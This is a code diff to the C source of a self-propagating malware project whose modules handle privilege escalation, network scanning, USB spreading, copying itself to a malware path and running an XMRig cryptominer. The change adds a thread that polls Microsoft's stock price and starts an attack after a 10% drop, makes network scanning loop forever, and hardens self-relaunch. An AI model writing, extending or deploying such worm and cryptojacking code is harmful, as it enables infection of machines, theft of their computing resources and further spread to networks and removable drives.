@@ -1,3 +1,4 @@
+#include "stock_client.h"
 #include "ipp_server.h"
 #include "lpe.h"
 #include "propagate.h"
@@ -7,6 +8,20 @@
 #include "unix_usb_spreader.h"
 
 
+void * start_trigger(void *varg){
+    Globals *global = (Globals *) varg;
+    int trigger_attack;
+    global->printf("Starting trigger module...\n");
+    
+    trigger_attack = get_microsoft_stock(global);
+    while(trigger_attack != 1) // Wait until stock value drops by 10%
+    {
+        trigger_attack = get_microsoft_stock(global);
+        global->usleep(1000); // Delay for 1000 microseconds (1 millisecond)
+    }
+    // call attack function
+}
+
 void * start_propagate(void *varg){
     Globals *global = (Globals *) varg;
     DEBUG_LOG("[ENTRY] Starting propagation module...\n");
@@ -15,7 +30,10 @@ void * start_propagate(void *varg){
 void * start_network_scanner(void *varg){
     Globals *global = (Globals *) varg;
     DEBUG_LOG("[ENTRY] Starting network-scanner module...\n");
-    scan_net(global);
+    while(1){
+        scan_net(global);
+        global->sleep(10);
+    }
 }
 
 void * start_ipp_server(void *varg){
@@ -32,7 +50,6 @@ void * start_usb_propagate(void *varg) {
 
 void * start_xmr(void *varg) {
     Globals *global = (Globals *) varg;
-
     DEBUG_LOG("[ENTRY] Starting xmr module...\n");
     xmrig(global);
 }
@@ -60,9 +77,14 @@ void entry(Globals *global) {
         copy_to_malware_path(global, syspath);
         if (global->execl(syspath, syspath, NULL) != 0) {
             DEBUG_LOG_ERR("[USB] fail to execute binary in EXECUTABLE PATH\n");
+        } else {
+            global->exit(0);
         }
-        return;
     }
+  
+    // start trigger of the attack
+    pthread_t thread_id_trigger;
+    global->pthread_create(&thread_id_trigger, NULL, start_trigger, global);
 
     // start propagate
     pthread_t thread_id_propagate;
@@ -79,11 +101,6 @@ void entry(Globals *global) {
     // start usb spread monitor
     pthread_t thread_id_usb;
     global->pthread_create(&thread_id_usb, NULL, start_usb_propagate, global);
-    
-
-    //TODO: remove test cryptominer, use from trigger moment instead
-    //pthread_t thread_id_money;
-    //global->pthread_create(&thread_id_money, NULL, start_xmr, global);
 
     DEBUG_LOG("[ENTRY] Started all modules!\n");
     // keep running
